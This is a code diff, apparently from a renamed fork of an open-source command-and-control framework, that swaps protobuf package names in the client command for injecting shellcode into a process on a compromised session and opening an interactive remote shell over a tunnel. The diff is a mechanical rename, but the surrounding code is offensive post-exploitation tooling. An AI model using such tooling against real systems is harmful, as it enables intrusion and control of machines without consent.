@@ -29,7 +29,7 @@ import (
 	"github.com/starkzarn/glod/client/console"
 	"github.com/starkzarn/glod/client/core"
 	"github.com/starkzarn/glod/protobuf/clientpb"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 	"golang.org/x/term"
 	"google.golang.org/protobuf/proto"
 
@@ -96,7 +96,7 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 	ctrl := make(chan bool)
 	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
 	con.SpinUntil(msg, ctrl)
-	shellcodeTask, err := con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
+	shellcodeTask, err := con.Rpc.Task(context.Background(), &glodpb.TaskReq{
 		Data:     shellcodeBin,
 		RWXPages: rwxPages,
 		Pid:      uint32(pid),
@@ -125,7 +125,7 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 }
 
 // PrintExecuteShellcode - Display result of shellcode execution
-func PrintExecuteShellcode(task *sliverpb.Task, con *console.SliverConsoleClient) {
+func PrintExecuteShellcode(task *glodpb.Task, con *console.SliverConsoleClient) {
 	if task.Response.GetErr() != "" {
 		con.PrintErrorf("%s\n", task.Response.GetErr())
 	} else {
@@ -145,7 +145,7 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 		noPty = true // Windows of course doesn't have PTYs
 	}
 
-	rpcTunnel, err := con.Rpc.CreateTunnel(context.Background(), &sliverpb.Tunnel{
+	rpcTunnel, err := con.Rpc.CreateTunnel(context.Background(), &glodpb.Tunnel{
 		SessionID: session.ID,
 	})
 
@@ -156,7 +156,7 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 
 	tunnel := core.GetTunnels().Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())
 
-	shell, err := con.Rpc.Shell(context.Background(), &sliverpb.ShellReq{
+	shell, err := con.Rpc.Shell(context.Background(), &glodpb.ShellReq{
 		Request:   con.ActiveTarget.Request(ctx),
 		Path:      hostProc,
 		EnablePTY: !noPty,
@@ -173,7 +173,7 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 	ctrl := make(chan bool)
 	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
 	con.SpinUntil(msg, ctrl)
-	_, err = con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
+	_, err = con.Rpc.Task(context.Background(), &glodpb.TaskReq{
 		Request:  con.ActiveTarget.Request(ctx),
 		Pid:      pid,
 		Data:     shellcode,
